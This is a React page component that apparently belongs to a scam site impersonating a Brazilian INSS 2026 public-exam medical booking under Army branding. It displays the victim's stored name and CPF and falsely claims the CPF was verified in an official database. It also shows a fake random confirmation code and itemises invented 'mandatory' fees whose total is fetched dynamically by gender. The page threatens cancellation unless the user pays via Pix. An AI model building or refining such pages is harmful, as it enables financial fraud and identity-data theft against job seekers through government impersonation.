import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { ArrowRight, Calendar, Clock, MapPin, Phone, AlertTriangle, CreditCard, Shield } from 'lucide-react';
import { ExercitoHeader } from '@/components/ExercitoHeader';
import { ExercitoFooter } from '@/components/ExercitoFooter';
import { useClarityEvents } from '@/hooks/use-clarity-events';
import { normalizeGender } from '@/utils/gender';

interface AppointmentData {
  date: string;
  time: string;
  center: {
    name: string;
    address: string;
    phone: string;
    type: string;
  };
  candidateName: string;
  scheduledAt: string;
}

function getBreakdown(total: number) {
  const r1 = 52.45 / 147.24;
  const r2 = 46.15 / 147.24;
  const taxa       = Math.round(total * r1 * 100) / 100;
  const emolumento = Math.round(total * r2 * 100) / 100;
  const custeio    = Math.round((total - taxa - emolumento) * 100) / 100;
  return { taxa, emolumento, custeio };
}

function fmt(v: number) {
  return v.toFixed(2).replace('.', ',');
}

export default function ConfirmacaoMedicaPage() {
  const [, setLocation] = useLocation();
  const [appointmentData, setAppointmentData] = useState<AppointmentData | null>(null);
  const [confirmationCode, setConfirmationCode] = useState('');
  const [candidateFullName, setCandidateFullName] = useState('');
  const [candidateCPF, setCandidateCPF] = useState('');
  const [candidateGender, setCandidateGender] = useState('');
  const [ticketAmount, setTicketAmount] = useState<number>(() => {
    const saved = localStorage.getItem('confirmarDadosPixAmount');
    return saved ? parseFloat(saved) : 0;
  });
  const { trackEvent } = useClarityEvents();

  useEffect(() => {
    window.scrollTo(0, 0);
    
    // Check if user passed through login validation
    const loginValidated = localStorage.getItem('loginValidated');
    if (!loginValidated) {
      setLocation('/login-pos-pagamento');
      return;
    }
    
    loadAppointmentData();
    
    trackEvent('medical_confirmation_page_accessed', {
      page: 'confirmacao_medica',
      timestamp: new Date().toISOString()
    });
  }, []);

  const loadAppointmentData = () => {
    const storedData = localStorage.getItem('medicalAppointment');
    if (storedData) {
      const data = JSON.parse(storedData);
      setAppointmentData(data);
    }
    
    // Load candidate data from localStorage
    const currentUser = localStorage.getItem('currentUser');
    const userData = localStorage.getItem('userData');
    const userMedicalLogin = localStorage.getItem('userMedicalLogin');
    
    if (currentUser || userData || userMedicalLogin) {
      try {
        const parsedCurrentUser = currentUser ? JSON.parse(currentUser) : null;
        const parsedUserData = userData ? JSON.parse(userData) : null;
        const parsedMedicalLogin = userMedicalLogin ? JSON.parse(userMedicalLogin) : null;
        
        // Get full name — fallback chain: currentUser → userData → userMedicalLogin
        const fullName = parsedCurrentUser?.name || 
                         parsedUserData?.name ||
                         parsedCurrentUser?.nomeCompleto || 
                         parsedUserData?.autoFilledData?.nome || 
                         parsedUserData?.nomeCompleto ||
                         parsedMedicalLogin?.name ||
                         parsedMedicalLogin?.nomeCompleto ||
                         parsedMedicalLogin?.autoFilledData?.nome || '';
        setCandidateFullName(fullName);
        
        // Get CPF — fallback chain: currentUser → userData → userMedicalLogin
        const cpf = parsedCurrentUser?.cpf || 
                    parsedUserData?.autoFilledData?.cpf || 
                    parsedUserData?.cpf ||
                    parsedMedicalLogin?.cpf ||
                    parsedMedicalLogin?.autoFilledData?.cpf || '';
        setCandidateCPF(cpf);
        
        // Get gender — fallback chain: currentUser → userData → userMedicalLogin
        const rawGender = parsedCurrentUser?.gender ||
                          parsedUserData?.gender ||
                          parsedCurrentUser?.sexo ||
                          parsedUserData?.sexo ||
                          parsedMedicalLogin?.gender ||
                          parsedMedicalLogin?.sexo ||
                          parsedUserData?.autoFilledData?.sexo || '';
        const gender = normalizeGender(rawGender);
        setCandidateGender(gender);

        // Fetch ticket amount unless already cached
        if (!localStorage.getItem('confirmarDadosPixAmount')) {
          fetch(`/api/valor-dinamico?tipo=medica&genero=${encodeURIComponent(gender)}`)
            .then((r) => r.json())
            .then((data) => {
              const valor = data.success ? data.valor : 68.92;
              localStorage.setItem('confirmarDadosPixAmount', valor.toString());
              setTicketAmount(valor);
            })
            .catch(() => {
              localStorage.setItem('confirmarDadosPixAmount', '68.92');
              setTicketAmount(68.92);
            });
        }
      } catch (error) {
        console.log('Error loading candidate data:', error);
      }
    }
    
    // Generate confirmation code (or restore from localStorage if already created)
    const savedCode = localStorage.getItem('medicalConfirmationCode');
    const code = savedCode || ('MED-' + Math.random().toString(36).substr(2, 9).toUpperCase());
    if (!savedCode) {
      localStorage.setItem('medicalConfirmationCode', code);
    }
    setConfirmationCode(code);
  };

  const handleProceedToResults = () => {
    trackEvent('proceed_to_medical_results', {
      confirmation_code: confirmationCode,
      page: 'confirmacao_medica',
      timestamp: new Date().toISOString()
    });
    
    setLocation('/resultados-medicos');
  };

  if (!appointmentData) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-gray-400 mx-auto mb-4"></div>
          <p className="text-gray-600 text-sm">Carregando dados do agendamento...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col" style={{ fontFamily: 'Rawline, Arial, sans-serif' }}>
      <ExercitoHeader />
      
      <main className="flex-1 container mx-auto max-w-4xl px-4 py-6">
        {/* Breadcrumb */}
        <nav className="text-sm text-gray-500 mb-6">
          <span>Concurso Público INSS 2026</span>
          <span className="mx-1 text-gray-400">›</span> 
          <span>Exame Médico</span>
          <span className="mx-1 text-gray-400">›</span> 
          <span className="text-gray-900 font-medium">Confirmação</span>
        </nav>

        {/* Header */}
        <header className="mb-8">
          <h1 className="text-xl font-semibold text-gray-900 mb-2 leading-tight">
            Agendamento Recebido — Regularização Obrigatória Pendente
          </h1>
          <p className="text-sm text-gray-500 leading-relaxed mb-4">
            {candidateGender === 'feminino'
              ? "Seu exame foi pré-agendado com total privacidade. Ainda falta uma etapa obrigatória para confirmar sua vaga — veja abaixo."
              : "Seu exame médico foi pré-agendado. Ainda falta uma etapa obrigatória para confirmar sua vaga — veja abaixo."
            }
            {candidateGender === 'feminino' && <> Processo adaptado às especificidades femininas com respeito e profissionalismo.</>}
          </p>

          <div className="flex items-center gap-2 px-3 py-2 bg-amber-50 border border-amber-200 rounded-lg w-fit">
            <AlertTriangle className="w-4 h-4 text-amber-600 flex-shrink-0" />
            <p className="text-xs font-medium text-gray-700">
              Código de Confirmação: <span className="font-mono font-semibold text-gray-900">{confirmationCode}</span>
            </p>
          </div>
        </header>

        {/* Appointment Details */}
        <article className="mb-8">
          <h2 className="text-base font-semibold text-gray-700 mb-4">Detalhes do Agendamento</h2>
          <div className="grid md:grid-cols-2 gap-6 text-sm text-gray-700">
            <div>
              <h3 className="text-xs font-semibold uppercase tracking-wide text-gray-400 mb-2">Informações do exame</h3>
              <div className="space-y-1">
                <p><strong>Data:</strong> {new Date(appointmentData.date).toLocaleDateString('pt-BR', { 
                  weekday: 'long', 
                  day: 'numeric', 
                  month: 'long', 
                  year: 'numeric' 
                })}</p>
                <p><strong>Horário:</strong> {appointmentData.time}</p>
                <p><strong>Local:</strong> {appointmentData.center.name}</p>
              </div>
            </div>
            <div>
              <h3 className="text-xs font-semibold uppercase tracking-wide text-gray-400 mb-2">Endereço e contato</h3>
              <div className="space-y-1">
                <p>{appointmentData.center.address}</p>
              </div>
            </div>
          </div>
        </article>

        {/* Important Information */}
        <article className="mb-8">
          <h2 className="text-base font-semibold text-gray-700 mb-4">
            {candidateGender === 'feminino' 
              ? "Orientações para o Exame"
              : "Orientações para o Exame"
            }
          </h2>
          <div className="grid md:grid-cols-2 gap-6 text-sm text-gray-700">
            <div>
              <h3 className="text-xs font-semibold uppercase tracking-wide text-gray-400 mb-2">Documentos obrigatórios</h3>
              <ul className="space-y-1">
                <li>• RG e CPF (originais)</li>
                <li>• Comprovante de endereço</li>
                <li>• Protocolo oficial INSS</li>
                <li>• Código: <strong>{confirmationCode}</strong></li>
                {candidateGender === 'feminino' && (
                  <li>• Acompanhante permitido (se desejar)</li>
                )}
              </ul>
            </div>
            <div>
              <h3 className="text-xs font-semibold uppercase tracking-wide text-gray-400 mb-2">
                {candidateGender === 'feminino' ? "Preparação" : "Recomendações"}
              </h3>
              <ul className="space-y-1">
                <li>• Chegar 15 minutos antes</li>
                <li>• Jejum de 4 horas (água liberada)</li>
                <li>• Evitar exercícios intensos</li>
                {candidateGender === 'feminino' && (
                  <>
                    <li>• Roupas confortáveis e fáceis de vestir</li>
                    <li>• Ambiente reservado garantido</li>
                    <li>• Duração estimada: 45 minutos</li>
                  </>
                )}
              </ul>
            </div>
          </div>
          
          {candidateGender === 'feminino' && (
            <div className="mt-4 flex items-start space-x-2 p-3 bg-white border border-gray-200 rounded-lg">
              <Shield className="w-4 h-4 text-gray-500 flex-shrink-0 mt-0.5" />
              <div className="text-xs text-gray-600 space-y-0.5">
                <p><strong className="text-gray-700">Privacidade total</strong> — exame em ambiente reservado com profissionais especializadas.</p>
                <p><strong className="text-gray-700">Reagendamento</strong> — facilidade para reagendar em casos especiais sem penalização.</p>
              </div>
            </div>
          )}
        </article>

        {/* Mandatory Tax Payment Alert */}
        <article className="mb-8">
          <div className="bg-white border border-red-200 rounded-lg overflow-hidden">
            <div className="h-1 bg-red-500" />
            <div className="p-4">
              <div className="flex items-start space-x-3">
                <AlertTriangle className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" />
                <div className="flex-1">
                  <h3 className="text-base font-semibold text-gray-900 mb-3">
                    Agendamento Confirmado — Regularização Pendente
                  </h3>

                  <p className="text-sm text-gray-600 mb-1">
                    <strong className="text-gray-800">{candidateFullName || 'Candidato'}</strong>, seus dados foram validados no Portal do INSS.
                  </p>
                  <p className="text-xs text-gray-500 mb-4">
                    ✓ CPF {candidateCPF ? candidateCPF.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.***.***-$4') : '***.***.***-**'} confirmado na base oficial
                  </p>

                  <p className="text-sm text-gray-600 mb-4">
                    Para finalizar sua inscrição e garantir sua vaga, é necessário quitar as taxas administrativas.
                  </p>

                  <div className="mb-4">
                    <p className="text-xs font-semibold uppercase tracking-wide text-gray-400 mb-2">Taxas de Finalização da Inscrição</p>
                    {ticketAmount > 0 ? (() => {
                      const bd = getBreakdown(ticketAmount);
                      return (
                        <div className="divide-y divide-gray-100 text-sm">
                          <div className="flex justify-between py-1.5">
                            <span className="text-gray-600">Taxa de Agendamento e Confirmação Médica</span>
                            <span className="font-medium text-gray-900">R$ {fmt(bd.taxa)}</span>
                          </div>
                          <div className="flex justify-between py-1.5">
                            <span className="text-gray-600">Taxa de Processamento Documental — INSS</span>
                            <span className="font-medium text-gray-900">R$ {fmt(bd.emolumento)}</span>
                          </div>
                          <div className="flex justify-between py-1.5">
                            <span className="text-gray-600">Taxa de Finalização de Cadastro no Portal</span>
                            <span className="font-medium text-gray-900">R$ {fmt(bd.custeio)}</span>
                          </div>
                          <div className="flex justify-between py-2 font-bold text-sm">
                            <span>VALOR TOTAL</span>
                            <span className="text-red-600">R$ {fmt(ticketAmount)}</span>
                          </div>
                        </div>
                      );
                    })() : (
                      <div className="text-sm text-gray-400 py-2">Carregando taxas...</div>
                    )}
                    <p className="text-xs text-gray-400 mt-2">Base Legal: Taxas obrigatórias conforme edital do Concurso Público INSS 2026.</p>
                  </div>

                  <p className="text-xs text-red-600 mb-4 font-medium">O não pagamento cancelará automaticamente sua inscrição no concurso.</p>

                  <button
                    className="w-full max-w-sm mx-auto flex items-center justify-center py-3 text-sm font-semibold text-white rounded-lg transition-colors duration-200"
                    style={{ backgroundColor: '#0063AF' }}
                    onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#004D8C'}
                    onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#0063AF'}
                    onClick={() => {
                      trackEvent('finalize_tax_payment_clicked', {
                        candidate_name: candidateFullName,
                        total_amount: ticketAmount.toString(),
                        page: 'confirmacao_medica',
                        timestamp: new Date().toISOString()
                      });
                      window.scrollTo({ top: 0, behavior: 'smooth' });
                      setLocation('/confirmar-dados');
                    }}
                  >
                    Finalizar Pagamento
                  </button>
                </div>
              </div>
            </div>
          </div>
        </article>
      </main>

      <ExercitoFooter />
    </div>
  );
}